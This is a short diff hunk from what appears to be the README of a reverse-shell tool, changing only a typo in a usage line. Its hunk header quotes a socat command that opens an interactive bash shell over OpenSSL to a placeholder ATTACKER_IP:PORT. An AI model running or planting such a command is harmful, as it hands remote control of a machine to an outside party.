@@ -30,7 +30,7 @@ socat exec:'bash -il',pty,stderr,setsid,sigint,sane OPENSSL:[ATTACKER_IP:PORT],v
 
 ## Usage
 
-« I quicly want an interactive reverse shell», take a wrap! 🥙
+« I quickly want an interactive reverse shell», take a wrap! 🥙
 ```shell
 # On attacker machine
 tmux
